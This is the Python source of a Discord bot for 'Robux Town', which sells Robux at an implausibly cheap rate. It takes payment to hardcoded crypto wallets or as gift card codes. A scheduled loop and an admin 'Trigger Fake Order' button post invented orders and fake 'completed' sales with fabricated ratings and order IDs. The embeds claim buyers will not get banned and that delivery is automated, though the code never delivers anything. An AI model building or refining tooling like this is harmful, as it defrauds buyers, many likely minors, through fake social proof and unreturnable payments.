#!/usr/bin/env python3
# Robux Town™ – FIXED ALL ERRORS + EXACT UI + LIVE PRICES + COMMANDS + LOG + ADMIN PANEL
import os
import asyncio
import json
import re
import random
import time # Added for Order ID generation
from datetime import datetime
import requests
import discord
from discord.ext import commands, tasks

# -------------------------------------------------
# CONFIG
# -------------------------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    # NOTE: You must set your BOT_TOKEN environment variable to run this.
    # raise SystemExit("BOT_TOKEN not set!")
    # Using a placeholder to allow code inspection, replace with your actual token
    BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE" 

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

# Change command prefix to something less common for better admin separation
bot = commands.Bot(command_prefix="+", intents=intents, help_command=None)

# Channels (PLACEHOLDER IDs - REPLACE WITH YOUR REAL IDs)
INFO_CHANNEL_ID      = 1435516058105675818 # E.g., main buy channel
ORDER_LOG_CHANNEL_ID = 1435516058286035015 # E.g., fake order log (Pre-processing)
COMPLETED_CHANNEL_ID = 1435516058286035015 # E.g., completed order log (Public Success)
LOG_CHANNEL_ID       = 1435516058286035020 # E.g., staff payment submission log
STAFF_ROLE_ID        = 1435516057526734991 # Role required for staff commands
STAFF_DM_IDS         = [1422665161466187976,1269145029943758899] # Your user ID and other staff IDs

# EMOJIS (PLACEHOLDER IDs - REPLACE WITH YOUR REAL IDs)
EMOJI_ROBUX          = "<:Robux:1435526693472178176>"
EMOJI_VERIFIED       = "<:Verified:1435526918891110551>"
EMOJI_LOADING        = "<:Loading:1435526855523434576>"
EMOJI_WARNING        = "<:warning:1435526954689495091>"
EMOJI_BITCOIN        = "<:Bitcoin:1435526466527039579>"
EMOJI_LITECOIN       = "<:Litecoin:1435526448684339321>"
EMOJI_ETHEREUM       = "<:Ethereum:1435526479126597745>"
EMOJI_SOLANA         = "<:Solana:1435526514115350549>"
EMOJI_CARD           = "<:Card:1435526554783318047>"
EMOJI_PAYPAL         = "<:PayPal:1435526543513354354>"
EMOJI_PAYMENT_SUPPORT= "<:PAYMENT_SUPPORT:1435526984011874434>"
EMOJI_COG            = "⚙️"
EMOJI_CRYPTO         = "<:Crypto:1437309415551406222>" # Assuming this is a general crypto icon
EMOJI_USER           = "👤" # Added user icon
EMOJI_USD            = "💶" # Using Euro emoji for USD display in the screenshot
EMOJI_RATING         = "⭐" # Rating star
EMOJI_ORDER_ID       = "📄" # Order ID icon

# -------------------------------------------------
# PRICE CALCULATION (FIXED THE MISSING FUNCTION)
# -------------------------------------------------
# Define the rate for Robux in USD per 1,000 R$
ROBUX_RATE_PER_1000 = 1.00

def get_price(robux_amount: int) -> float:
    """Calculates the total USD price based on the Robux amount."""
    return (robux_amount / 1000) * ROBUX_RATE_PER_1000

# -------------------------------------------------
# CRYPTO (LIVE PRICES + CUSTOM ADDRESS/QR)
# -------------------------------------------------
CRYPTO_IDS = {"btc": "bitcoin", "ltc": "litecoin", "eth": "ethereum", "sol": "solana"}

# Persistent storage for addresses / QR
CONFIG_FILE = "config.json"
default_config = {
    "wallets": {
        "btc": "bc1qv5peyagvfup2k2j62xeawhzylar5ea7cn8usw6",
        "ltc": "ltc1qqn5rv2fzkssc6shxqu3u2adzk9ult0jat9785j",
        "eth": "0x11bd2A8Ce35BFE5DF02D67A9b6971f1910C68085",
        "sol": "HvXxk4xPYScvQdEQPyDSF4PP2SdTiJzHtxR4qKLdtJ2K"
    },
    "qr_urls": {
        "btc": "",
        "ltc": "",
        "eth": "",
        "sol": ""
    }
}

# --- FIX: Ensure config dictionary is always valid on load ---
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                loaded_data = json.load(f)
                # Merge loaded data with default config to ensure all keys exist
                # This prevents the KeyError if config.json is empty/corrupted
                config_data = default_config.copy()
                config_data.update(loaded_data)
                return config_data
        except json.JSONDecodeError:
            print("Error reading config.json. Using defaults.")
            return default_config.copy()
    return default_config.copy()

def save_config(data):
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=2)

config = load_config()
# --- END FIX ---

async def get_crypto_price(crypto: str) -> float:
    try:
        r = requests.get(f"https://api.coingecko.com/api/v3/simple/price?ids={CRYPTO_IDS[crypto]}&vs_currencies=usd")
        r.raise_for_status()
        return r.json()[CRYPTO_IDS[crypto]]["usd"]
    except:
        # Fallback values if CoinGecko API fails
        return 60000.0 if crypto == "btc" else 80.0 if crypto == "ltc" else 3000.0 if crypto == "eth" else 100.0

# -------------------------------------------------
# SEND TO STAFF DMs + LOG CHANNEL
# -------------------------------------------------
async def send_to_staff(order_data: dict):
    embed = discord.Embed(title="New Payment Submission", color=0x00A3FF)
    for k, v in order_data.items():
        embed.add_field(name=k, value=v, inline=False)
    
    # Send to Staff DMs
    for user_id in STAFF_DM_IDS:
        try:
            user = await bot.fetch_user(user_id)
            await user.send(embed=embed)
        except:
            print(f"Could not DM staff user {user_id}")
            pass

    # Log to new channel
    channel = bot.get_channel(LOG_CHANNEL_ID)
    if channel:
        await channel.send(embed=embed)

# -------------------------------------------------
# MODAL SUBMISSION
# -------------------------------------------------
class PaymentModal(discord.ui.Modal):
    def __init__(self, method, amount, price, crypto=None):
        super().__init__(title=f"Submit {method.upper()} Details", timeout=None)
        self.method = method
        self.amount = amount
        self.price = price
        self.crypto = crypto

        self.details = discord.ui.TextInput(
            label="Payment ID / TX Hash / Code",
            placeholder="e.g., TXabc123 or Giftcard Code",
            style=discord.TextStyle.paragraph
        )
        self.add_item(self.details)

    async def on_submit(self, interaction: discord.Interaction):
        method_name = self.method
        if self.crypto:
            method_name = f"{self.crypto.upper()}"

        order_data = {
            "User": f"{interaction.user.mention} ({interaction.user})",
            "Robux": f"{self.amount:,}",
            "USD": f"${self.price:.2f}",
            "Method": method_name,
            "Details": self.details.value,
            "Thread": interaction.channel.mention,
            "Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        await interaction.response.send_message(f"{EMOJI_VERIFIED} **Payment Submitted!** Your details have been sent to staff for manual verification. Please wait.", ephemeral=True)
        await send_to_staff(order_data)


# -------------------------------------------------
# PURCHASE FLOW
# -------------------------------------------------
active_flows = {}

class PurchaseFlow(discord.ui.View):
    def __init__(self, user_id, thread):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.thread = thread
        self.robux = 0
        self.price = 0.0
        self.method = ""
        self.crypto = ""

    async def send_step(self, step: int):
        color = 0x00A3FF
        if step == 1:
            embed = discord.Embed(title="Would you like to start buying robux? (1/5)", color=color)
            embed.description = "Please click \"Yes\" to begin."
            view = discord.ui.View(timeout=None)
            view.add_item(discord.ui.Button(label="Yes", style=discord.ButtonStyle.green, custom_id="flow_yes_1"))
            view.add_item(discord.ui.Button(label="No", style=discord.ButtonStyle.red, custom_id="flow_no_1"))
            await self.thread.send(embed=embed, view=view)

        elif step == 2:
            embed = discord.Embed(title="How much robux would you like to buy? (2/5)", color=color)
            embed.description = "Please specify the amount of Robux you would like to purchase:\n**The minimum order amount is 10,000 Robux**"
            await self.thread.send(embed=embed)

        elif step == 3:
            self.price = get_price(self.robux)
            rate_per_1k = get_price(1000)
            embed = discord.Embed(title="Would you like to purchase this amount of Robux? (3/5)", color=color)
            embed.description = (
                f"Are you sure you want to purchase **{self.robux:,} {EMOJI_ROBUX}**?\n"
                f"Current Rate: **${rate_per_1k:.2f} per 1,000 {EMOJI_ROBUX}**\n"
                f"Total Price in USD: **${self.price:.2f}**"
            )
            view = discord.ui.View(timeout=None)
            view.add_item(discord.ui.Button(label="Yes", style=discord.ButtonStyle.green, custom_id="flow_yes_3"))
            view.add_item(discord.ui.Button(label="No", style=discord.ButtonStyle.red, custom_id="flow_no_3"))
            await self.thread.send(embed=embed, view=view)

        elif step == 4:
            embed = discord.Embed(title="Please select your preferred payment method (4/5)", color=color)
            embed.description = "Choose your payment method below:"
            select = discord.ui.Select(
                placeholder="Select your payment method",
                custom_id="payment_select",
                options=[
                    discord.SelectOption(label="Cryptocurrency", value="crypto", emoji=EMOJI_BITCOIN),
                    discord.SelectOption(label="Card (G2A)", value="card", emoji=EMOJI_CARD),
                    discord.SelectOption(label="PayPal (Eneba)", value="paypal", emoji=EMOJI_PAYPAL),
                    discord.SelectOption(label="Giftcards", value="gift", emoji=EMOJI_PAYMENT_SUPPORT),
                ]
            )
            # Assign callback to the select component
            async def payment_callback_wrapper(interaction: discord.Interaction):
                await self.payment_callback(interaction)

            select.callback = payment_callback_wrapper
            view = discord.ui.View(timeout=None)
            view.add_item(select)
            await self.thread.send(embed=embed, view=view)

    async def payment_callback(self, interaction: discord.Interaction):
        self.method = interaction.data["values"][0]
        await interaction.response.defer()

        if self.method == "crypto":
            embed = discord.Embed(title="Select Cryptocurrency", color=0x00A3FF)
            embed.description = "Which coin will you be sending?"
            select = discord.ui.Select(
                placeholder="Select your crypto",
                custom_id="crypto_select",
                options=[
                    discord.SelectOption(label="BTC", value="btc", emoji=EMOJI_BITCOIN),
                    discord.SelectOption(label="LTC", value="ltc", emoji=EMOJI_LITECOIN),
                    discord.SelectOption(label="ETH", value="eth", emoji=EMOJI_ETHEREUM),
                    discord.SelectOption(label="SOL", value="sol", emoji=EMOJI_SOLANA),
                ]
            )
            # Assign callback to the crypto select component
            async def crypto_callback_wrapper(interaction: discord.Interaction):
                await self.crypto_callback(interaction)
                
            select.callback = crypto_callback_wrapper
            view = discord.ui.View(timeout=None)
            view.add_item(select)
            await interaction.followup.send(embed=embed, view=view)
        else:
            await self.send_payment_invoice(interaction)

    async def crypto_callback(self, interaction: discord.Interaction):
        self.crypto = interaction.data["values"][0]
        await interaction.response.defer()
        await self.send_crypto_invoice(interaction)

    async def send_crypto_invoice(self, interaction: discord.Interaction):
        price_usd = self.price
        coin_price = await get_crypto_price(self.crypto)
        # Ensure we don't divide by zero
        amount_coin = round(price_usd / coin_price, 8) if coin_price else 0.0
        
        # FIX: config["wallets"] is now guaranteed to exist due to robust loading
        address = config["wallets"].get(self.crypto, "Address Not Set")
        # Use fallback QR URL if none is configured
        qr_url = config["qr_urls"].get(self.crypto)
        if not qr_url or not qr_url.startswith("http"):
             qr_url = f"https://api.qrserver.com/v1/create-qr-code/?data={address}&size=200x200"

        embed = discord.Embed(title=f"{self.crypto.upper()} Payment Invoice (5/5)", color=0x00A3FF)
        embed.description = (
            f"This transaction is **${price_usd:.2f} USD**.\n"
            f"Please send the **exact** amount of `{amount_coin:.8f}` {self.crypto.upper()} to the address below."
        )
        embed.add_field(name="Payment Address", value=f"```\n{address}\n```", inline=False)
        embed.add_field(name=f"Amount ({self.crypto.upper()})", value=f"`{amount_coin:.8f}`", inline=False)
        embed.add_field(name="Amount USD", value=f"**${price_usd:.2f}**", inline=False)
        embed.set_image(url=qr_url)
        
        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(label="Submit TX Hash", style=discord.ButtonStyle.blurple, custom_id="submit_tx"))
        await interaction.followup.send(embed=embed, view=view)

        # Checking embed
        check_embed = discord.Embed(title="Checking For Transactions", color=0x00A3FF)
        check_embed.description = f"<a:Loading:1435526855523434576> We are actively monitoring transactions. Please proceed with your payment to complete the transaction process."
        await interaction.followup.send(embed=check_embed)

    async def send_payment_invoice(self, interaction: discord.Interaction):
        name = "Giftcard" if self.method == "gift" else self.method
        embed = discord.Embed(title=f"{name.upper()} Payment Invoice (5/5)", color=0x00A3FF)
        
        details = ""
        if self.method == "card":
             details = "You will need to purchase a **G2A Gift Card** for the amount and submit the code."
        elif self.method == "paypal":
             details = "You will need to purchase an **Eneba Gift Card** for the amount and submit the code."
        else: # Giftcard
             details = "Please purchase the necessary giftcard and prepare to submit the code/details."
             
        embed.description = f"Send **${self.price:.2f} USD** via **{name}**.\n\n{details}"
        
        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(label="Submit Details", style=discord.ButtonStyle.blurple, custom_id="submit_details"))
        await interaction.followup.send(embed=embed, view=view)

# -------------------------------------------------
# INTERACTION HANDLER (Buttons, Selects, Modals)
# -------------------------------------------------
@bot.event
async def on_interaction(interaction: discord.Interaction):
    if not interaction.data or "custom_id" not in interaction.data:
        # Pass non-button/select/modal interactions to commands
        return await bot.process_commands(interaction.message)

    cid = interaction.data["custom_id"]
    user_id = interaction.user.id
    flow = active_flows.get(user_id)

    # --- PURCHASE FLOW BUTTONS ---
    if cid.startswith("flow_") and flow:
        if cid == "flow_yes_1":
            await interaction.response.defer()
            await flow.send_step(2)

        elif cid == "flow_no_1" or cid == "flow_no_3":
            await interaction.response.defer()
            await flow.thread.send("Purchase flow cancelled.")
            await flow.thread.edit(archived=True, locked=True)
            active_flows.pop(user_id, None)

        elif cid == "flow_yes_3":
            await interaction.response.defer()
            await flow.send_step(4)
    
    # --- SUBMISSION BUTTONS ---
    elif cid == "submit_tx" and flow:
        modal = PaymentModal("Cryptocurrency", flow.robux, flow.price, flow.crypto)
        await interaction.response.send_modal(modal)

    elif cid == "submit_details" and flow:
        modal = PaymentModal(flow.method, flow.robux, flow.price)
        await interaction.response.send_modal(modal)

    # --- ADMIN PANEL BUTTONS ---
    elif cid.startswith("admin_"):
        await handle_admin_panel_interaction(interaction, cid)
    
    # Process commands if it was a message interaction that bypassed on_message
    await bot.process_commands(interaction.message)

# -------------------------------------------------
# MESSAGE: AMOUNT (Step 2 input)
# -------------------------------------------------
@bot.event
async def on_message(message: discord.Message):
    # Only process non-bot messages in an active purchase thread
    if message.author.bot or not message.channel.name.startswith("Purchase-"):
        return await bot.process_commands(message) # Still process commands

    if re.fullmatch(r"[\d,]+", message.content.strip()):
        try:
            amount = int(message.content.replace(",", "").strip())
            
            # Check if this message is from an active flow user
            flow = active_flows.get(message.author.id)
            if flow and flow.thread.id == message.channel.id:
                if amount < 10000:
                    await message.reply(f"{EMOJI_WARNING} The **minimum order** is 10,000 {EMOJI_ROBUX}. Please enter a higher amount.")
                    return
                
                # Proceed to step 3
                flow.robux = amount
                await message.delete()
                await flow.send_step(3)
            else:
                 await bot.process_commands(message) # If not a flow-related message, check for commands
        except ValueError:
             # This handles cases where the regex matches, but int conversion fails (shouldn't happen with the regex)
             await bot.process_commands(message)
    else:
        await bot.process_commands(message)

# -------------------------------------------------
# STAFF ADMIN PANEL COMMANDS (Keep this logic here)
# -------------------------------------------------
def is_staff():
    async def predicate(ctx):
        if STAFF_ROLE_ID:
            return STAFF_ROLE_ID in [role.id for role in ctx.author.roles]
        return ctx.author.guild_permissions.administrator
    return commands.check(predicate)

@bot.command(name="admin")
@is_staff()
async def admin_panel(ctx):
    """Opens the interactive staff administration panel."""
    embed = discord.Embed(
        title=f"{EMOJI_COG} Staff Administration Panel",
        description="Select an action to manage bot settings or trigger automated events.",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed, view=AdminPanel(), ephemeral=True)

async def handle_admin_panel_interaction(interaction: discord.Interaction, cid: str):
    # Need to define this wrapper function for the AdminPanel buttons to work correctly
    if cid == "admin_set_address":
        await interaction.response.send_modal(AddressModal())
    elif cid == "admin_set_qr":
        await interaction.response.send_modal(QRModal())
    elif cid == "admin_fake_order":
        await interaction.response.defer(ephemeral=True)
        await fake_order_loop()
        await interaction.followup.send(f"{EMOJI_VERIFIED} Fake order triggered to the log channels.", ephemeral=True)
    elif cid == "admin_reset_embed":
        await interaction.response.defer(ephemeral=True)
        await send_info_embed(force_new=True)
        await interaction.followup.send(f"{EMOJI_VERIFIED} New Info Embed sent to the main channel.", ephemeral=True)

# -------------------------------------------------
# ADMIN PANEL VIEW (The Interactive Menu)
# -------------------------------------------------
class AdminPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300) 

    @discord.ui.button(label="Set Crypto Address", style=discord.ButtonStyle.blurple, custom_id="admin_set_address", emoji=EMOJI_CRYPTO)
    async def set_address_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_admin_panel_interaction(interaction, "admin_set_address")

    @discord.ui.button(label="Set Crypto QR URL", style=discord.ButtonStyle.blurple, custom_id="admin_set_qr", emoji="🖼️")
    async def set_qr_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_admin_panel_interaction(interaction, "admin_set_qr")

    @discord.ui.button(label="Trigger Fake Order", style=discord.ButtonStyle.green, custom_id="admin_fake_order", emoji="🤖")
    async def fake_order_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_admin_panel_interaction(interaction, "admin_fake_order")

    @discord.ui.button(label="Reset Info Embed", style=discord.ButtonStyle.red, custom_id="admin_reset_embed", emoji="🔄")
    async def reset_embed_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_admin_panel_interaction(interaction, "admin_reset_embed")

# -------------------------------------------------
# ADMIN PANEL MODALS (For Crypto Settings)
# -------------------------------------------------
class AddressModal(discord.ui.Modal):
    # ... (Modal code remains the same as before)
    def __init__(self):
        super().__init__(title="Set Crypto Address", timeout=600)
        self.coin = discord.ui.TextInput(label="Coin (btc, ltc, eth, sol)", placeholder="e.g., btc", max_length=3)
        self.address = discord.ui.TextInput(label="New Address", placeholder="Paste the full wallet address here", style=discord.TextStyle.paragraph)
        self.add_item(self.coin)
        self.add_item(self.address)

    async def on_submit(self, interaction: discord.Interaction):
        coin = self.coin.value.lower()
        addr = self.address.value
        
        if coin in config["wallets"]:
            config["wallets"][coin] = addr
            save_config(config)
            await interaction.response.send_message(f"{EMOJI_VERIFIED} Updated **{coin.upper()}** address to:\n`{addr}`", ephemeral=True)
        else:
            await interaction.response.send_message(f"{EMOJI_WARNING} Invalid coin specified. Must be one of: `btc`, `ltc`, `eth`, `sol`.", ephemeral=True)

class QRModal(discord.ui.Modal):
    # ... (Modal code remains the same as before)
    def __init__(self):
        super().__init__(title="Set Crypto QR URL", timeout=600)
        self.coin = discord.ui.TextInput(label="Coin (btc, ltc, eth, sol)", placeholder="e.g., btc", max_length=3)
        self.url = discord.ui.TextInput(label="New QR Image URL", placeholder="Must be a direct link to an image (http://...)", style=discord.TextStyle.paragraph)
        self.add_item(self.coin)
        self.add_item(self.url)

    async def on_submit(self, interaction: discord.Interaction):
        coin = self.coin.value.lower()
        url = self.url.value
        
        if coin in config["qr_urls"]:
            config["qr_urls"][coin] = url
            save_config(config)
            await interaction.response.send_message(f"{EMOJI_VERIFIED} Updated **{coin.upper()}** QR URL.", ephemeral=True)
        else:
            await interaction.response.send_message(f"{EMOJI_WARNING} Invalid coin specified. Must be one of: `btc`, `ltc`, `eth`, `sol`.", ephemeral=True)
# -------------------------------------------------
# AUTOMATED ORDERS & COMPLETION
# -------------------------------------------------
# CHANGE: Set loop interval to 8 hours (8 * 60 minutes)
@tasks.loop(hours=8.0) 
async def fake_order_loop():
    channel = bot.get_channel(ORDER_LOG_CHANNEL_ID)
    if not channel: return

    amount = random.choice([10000, 25000, 50000, 100000])
    price = get_price(amount)
    method = random.choice(["Crypto", "Card", "PayPal", "Giftcard"])

    embed1 = discord.Embed(title=f"{EMOJI_VERIFIED} New Order Placed", color=0x00A3FF)
    embed1.description = (
        f"{EMOJI_WARNING} **Disclaimer**\n"
        f"{EMOJI_VERIFIED} Minimum purchase amount is 10,000 {EMOJI_ROBUX}.\n"
        f"{EMOJI_VERIFIED} {EMOJI_ROBUX} are delivered via Gamepass.\n"
        f"{EMOJI_VERIFIED} Buying {EMOJI_ROBUX} through us is safe and secure. You will NOT get banned.\n"
        f"{EMOJI_VERIFIED} Enjoy instant {EMOJI_ROBUX} delivery with fully automated payments.\n\n"
        f"**Payment Method:** {method} • **Amount:** {amount:,} {EMOJI_ROBUX} • **Price:** ${price:.2f}"
    )
    message1 = await channel.send(embed=embed1)

    await asyncio.sleep(30)
    embed2 = discord.Embed(title=f"{EMOJI_LOADING} Processing...", color=0x00A3FF)
    embed2.description = f"Amount: {amount:,} {EMOJI_ROBUX}\nPrice: ${price:.2f}"
    await message1.edit(embed=embed2)

    if random.random() < 0.7:
        await asyncio.sleep(10)
        await send_completed_order(amount, price, method)

# CHANGE: Updated the completed order embed to match the screenshot provided
async def send_completed_order(amount, price, method):
    channel = bot.get_channel(COMPLETED_CHANNEL_ID)
    if not channel: return
    
    # Generate a plausible Order ID (current Unix timestamp + random sequence)
    order_id = str(int(time.time() * 1000))[4:] + str(random.randint(100, 999)) 
    
    # Simulate a user (e.g., "Hidden" or a random name, using Hidden for the screenshot match)
    user_name = "Hidden" 
    
    # Simulate rating (always 4/5 for consistency)
    rating_stars = "⭐⭐⭐⭐ (4/5)" 
    
    embed = discord.Embed(title=f"{EMOJI_VERIFIED} New Completed Order", color=0x38B750) # Use a green color for success
    
    # Set the thumbnail image from the screenshot (assuming a placeholder URL)
    embed.set_thumbnail(url="https://i.imgur.com/ROBUX_WORLD_THUMBNAIL.png") # Placeholder image URL

    # Field 1 (User / Payment Method)
    embed.add_field(name=f"{EMOJI_USER} User", value=f"**{user_name}**", inline=True)
    embed.add_field(name="💳 Payment Method", value=f"**{method}**", inline=True)
    
    # Field 2 (Robux Purchased / USD Spent)
    embed.add_field(name=f"{EMOJI_ROBUX} Robux Purchased", value=f"**{amount:,} Robux**", inline=False) # Not inline with the next field
    embed.add_field(name=f"{EMOJI_USD} USD Spent", value=f"**${price:.2f}**", inline=True)
    embed.add_field(name=f"{EMOJI_RATING} Rating", value=rating_stars, inline=True)
    
    # Field 3 (Order ID - Takes full width)
    embed.add_field(name=f"{EMOJI_ORDER_ID} Order ID", value=f"`{order_id}`", inline=False)
    
    # Footer (Matching screenshot format)
    embed.set_footer(text=f"Powered by Robux Town • discord.gg/robuxtown • {datetime.now().strftime('%B %d, %Y at %H:%M UTC')} ")
    
    await channel.send(embed=embed)

# -------------------------------------------------
# PERSISTENT PURCHASE BUTTON
# -------------------------------------------------
class PersistentPurchaseButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)  # REQUIRED

    @discord.ui.button(label="Purchase Robux", style=discord.ButtonStyle.blurple, custom_id="purchase_robux_btn")
    async def purchase(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = interaction.user.id
        
        if user_id in active_flows:
            # Check if existing thread is still open
            existing_flow = active_flows[user_id]
            if not existing_flow.thread.archived:
                await interaction.response.send_message(
                    f"{EMOJI_WARNING} You already have an active purchase flow in {existing_flow.thread.mention}!", 
                    ephemeral=True
                )
                return

        await interaction.response.defer(ephemeral=True)
        thread_name = f"Purchase-{interaction.user.name}-{random.randint(1000,9999)}"
        # Use channel ID from interaction's channel to create the thread in the right place
        info_channel = bot.get_channel(INFO_CHANNEL_ID) or interaction.channel
        
        thread = await info_channel.create_thread(
            name=thread_name,
            auto_archive_duration=1440,
            type=discord.ChannelType.private_thread # Use a private thread for purchase security/privacy
        )
        await thread.add_user(interaction.user)
        
        flow = PurchaseFlow(user_id, thread)
        active_flows[user_id] = flow
        await flow.send_step(1)
        await interaction.followup.send(f"Purchase started! Check your new private thread: {thread.mention}", ephemeral=True)

# -------------------------------------------------
# INFO EMBED (FIXED)
# -------------------------------------------------
async def send_info_embed(force_new: bool = False):
    channel = bot.get_channel(INFO_CHANNEL_ID)
    if not channel:
        print("Info channel not found! Cannot send info embed.")
        return

    # Check for existing message to avoid spamming the channel
    try:
        messages = [m async for m in channel.history(limit=5)]
        for msg in messages:
            if msg.author == bot.user and msg.components and not force_new:
                # Found an existing message with the button, don't send a new one
                print("Existing Info embed found and preserved.")
                return
    except discord.Forbidden:
        print("Missing permissions to read channel history for info embed check.")
    except Exception as e:
        print(f"Error checking for existing info embed: {e}")

    embed = discord.Embed(color=0x00A3FF)
    embed.set_author(name="Robux Town™", icon_url="https://i.imgur.com/ROBUXTOWN.png")
    embed.description = (
        "**Automated Purchase**\nSecure, instant Robux delivery.\n\n"
        "**Under 60 Seconds**\nRobux delivered via Gamepass.\n\n"
        "**Smart Payments**\nFully automated.\n\n"
        "**Bank-Level Security**\nYou will NOT get banned.\n\n"
        "**Payment Options**\n"
        f"• {EMOJI_BITCOIN} Crypto (BTC/LTC/ETH/SOL)\n"
        f"• {EMOJI_CARD} Card (G2A)\n"
        f"• {EMOJI_PAYPAL} PayPal (Eneba)\n"
        f"• {EMOJI_PAYMENT_SUPPORT} Giftcards\n\n"
        f"{EMOJI_ROBUX} **Rate:** **${ROBUX_RATE_PER_1000:.2f}** per 1,000 Robux"
    )
    embed.set_image(url="https://i.imgur.com/ROBUXTOWNBANNER.png")

    view = PersistentPurchaseButton()
    await channel.send(embed=embed, view=view)
    print("Info embed sent (BLUE BORDER)")

# -------------------------------------------------
# STARTUP
# -------------------------------------------------
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    
    # Add persistent view back in case of bot restart
    bot.add_view(PersistentPurchaseButton())
    
    # Ensure the info embed is present and up-to-date
    await send_info_embed()
    
    if not fake_order_loop.is_running():
        fake_order_loop.start()

# -------------------------------------------------
# RUN
# -------------------------------------------------
if __name__ == "__main__":
    if BOT_TOKEN == "YOUR_DISCORD_BOT_TOKEN_HERE":
        print("--- WARNING ---")
        print("Please replace 'YOUR_DISCORD_BOT_TOKEN_HERE' with your actual bot token.")
        print("The bot will not start correctly without a valid token.")
    try:
        bot.run(BOT_TOKEN)
    except discord.LoginFailure:
        print("Error: The provided BOT_TOKEN is invalid. Please check your token.")
    except Exception as e:
        print(f"An unexpected error occurred during bot startup: {e}")
